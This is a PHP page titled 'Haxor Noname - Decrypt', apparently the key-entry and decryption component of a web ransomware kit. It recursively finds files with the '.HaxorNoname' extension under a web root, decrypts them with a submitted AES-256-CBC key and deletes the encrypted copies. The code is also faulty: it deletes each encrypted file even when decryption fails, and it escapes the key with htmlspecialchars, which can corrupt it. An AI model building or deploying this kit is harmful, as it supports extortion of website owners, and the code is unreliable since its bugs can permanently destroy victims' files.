<?php
include_once('config.php');

function decryptFile($filePath, $key) {
    $content = file_get_contents($filePath);

    if ($content === false) {
        echo "Failed to read file: $filePath";
        return;
    }

    $ivSize = openssl_cipher_iv_length('AES-256-CBC');
    $iv = substr($content, 0, $ivSize);
    $encryptedData = substr($content, $ivSize);

    $decrypted = openssl_decrypt($encryptedData, 'AES-256-CBC', $key, 0, $iv);

    if ($decrypted === false) {
        echo "Failed to decrypt file: $filePath";
        return;
    }

    $decryptedFilePath = str_replace('.HaxorNoname', '', $filePath);
    file_put_contents($decryptedFilePath, $decrypted);

    echo "File $filePath decrypted successfully. Decrypted file saved as $decryptedFilePath<br>";
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $key = htmlspecialchars($_POST['key'], ENT_QUOTES, 'UTF-8');

    if (empty($key)) {
        echo "Please enter a key.";
        exit;
    }

    $dir = '/var/www/html/blabla'; // Ganti dengan path yang sesuai 

    $encryptedFiles = 0;
    $files = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($dir),
        RecursiveIteratorIterator::LEAVES_ONLY
    );

    foreach ($files as $name => $file) {
        if (!$file->isDir() && strpos($name, '.HaxorNoname') !== false) {
            decryptFile($name, $key);
            unlink($name); // Hapus file terenkripsi setelah dekripsi
            $encryptedFiles++;
        }
    }

    if ($encryptedFiles > 0) {
        echo "Files decrypted successfully.";
    } else {
        echo "No encrypted files found.";
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Haxor Noname - Decrypt</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/hendprw/asuna/style.css"/>
</head>
<body>
    <h1>Haxor Noname - Decrypt</h1>
    <form method="POST">
        <label for="key">Enter key to decrypt files:</label><br>
        <input type="text" id="key" name="key"><br>
        <input type="submit" value="Submit">
    </form>
</body>
</html>
